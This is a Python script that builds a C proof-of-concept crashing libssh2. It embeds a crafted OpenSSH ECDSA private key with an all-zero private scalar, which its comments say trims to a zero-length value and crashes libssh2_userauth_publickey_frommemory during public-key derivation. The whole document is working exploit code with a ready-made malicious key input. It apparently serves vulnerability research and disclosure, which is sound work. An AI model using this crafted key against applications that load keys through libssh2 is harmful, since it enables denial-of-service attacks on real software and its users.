#!/usr/bin/env python3
# Generates a self-contained PoC (residual.c) carrying a crafted OpenSSH
# ("openssh-key-v1") ECDSA nistp256 private key whose private scalar mpint is
# all zeros. ssh2_get_bignum_bytes() trims the leading zero bytes, yielding a
# zero-length exponent that reaches ossl_swap_bytes() during public-key
# derivation in libssh2_userauth_publickey_frommemory().
import base64, struct, textwrap

# A valid uncompressed P-256 point (0x04 || X || Y); only its presence matters,
# the crash happens before the point is used.
Q = bytes.fromhex(
    "04ef6438d073237b7334383a4db61a377bccaf01e2ea4f863e2285cdb029f873"
    "33aeff2f15cd35a5a960580c1b56ae9c4882eb04fbd705eafc3ac9b6bf84baa5a2")

def s(b):            # SSH string: u32 length + bytes
    return struct.pack(">I", len(b)) + b

keytype = b"ecdsa-sha2-nistp256"
curve   = b"nistp256"

pubblob = s(keytype) + s(curve) + s(Q)

# private section: all-zero scalar -> trims to zero length
check = 0x01020304
scalar = b"\x00" * 32            # numerically zero, full-width encoding
priv = struct.pack(">II", check, check)
priv += s(keytype) + s(curve) + s(Q)
priv += s(scalar)                # the mpint that trims to length 0
priv += s(b"")                   # comment
# openssh pads to the cipher blocksize (8 for "none") with 1,2,3,...
pad = 1
while len(priv) % 8 != 0:
    priv += bytes([pad]); pad += 1

blob  = b"openssh-key-v1\x00"
blob += s(b"none") + s(b"none") + s(b"")   # cipher, kdf, kdfoptions
blob += struct.pack(">I", 1)               # nkeys
blob += s(pubblob)
blob += s(priv)

b64 = base64.b64encode(blob).decode()
pem = "-----BEGIN OPENSSH PRIVATE KEY-----\n"
pem += "\n".join(textwrap.wrap(b64, 70))
pem += "\n-----END OPENSSH PRIVATE KEY-----\n"

c = []
c.append('/* Auto-generated by gen.py. Drives the public libssh2 API with an')
c.append(' * in-contract crafted OpenSSH ECDSA private key (empty private')
c.append(' * scalar). No network is used: the crash occurs while deriving the')
c.append(' * public key from the private key, before any I/O. */')
c.append('#include <libssh2.h>')
c.append('#include <string.h>')
c.append('')
c.append('static const char key[] =')
for ln in pem.splitlines():
    c.append('    "%s\\n"' % ln)
c[-1] = c[-1] + ';'
c.append('')
c.append('int main(void)')
c.append('{')
c.append('    LIBSSH2_SESSION *session;')
c.append('    if(libssh2_init(0))')
c.append('        return 2;')
c.append('    session = libssh2_session_init();')
c.append('    if(!session)')
c.append('        return 2;')
c.append('    /* pubkey NULL -> libssh2 derives it from the private key blob */')
c.append('    libssh2_userauth_publickey_frommemory(session, "u", 1, NULL, 0,')
c.append('                                          key, strlen(key), NULL);')
c.append('    libssh2_session_free(session);')
c.append('    libssh2_exit();')
c.append('    return 0;')
c.append('}')

open("pocs/residual.c", "w").write("\n".join(c) + "\n")
print("wrote pocs/residual.c; priv_section_len=%d blob_len=%d" % (len(priv), len(blob)))
